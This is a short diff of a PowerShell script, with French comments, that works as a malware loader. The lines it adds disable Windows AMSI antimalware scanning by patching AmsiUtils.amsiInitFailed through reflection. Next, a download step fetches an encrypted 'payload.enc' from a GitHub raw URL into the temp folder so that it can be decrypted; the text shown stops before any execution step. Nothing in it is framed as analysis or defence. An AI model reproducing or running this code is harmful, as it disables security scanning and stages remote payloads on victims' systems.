@@ -1,3 +1,9 @@
+# AMSI bypass - patch AmsiUtils.amsiInitFailed en mémoire
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+# Télécharge et déchiffre payload.enc
 $url = "https://raw.githubusercontent.com/raacineagency/update-payload/refs/heads/main/payload.enc"
 $dst = "$env:TEMP\p.enc"
 (New-Object Net.WebClient).DownloadFile($url, $dst)
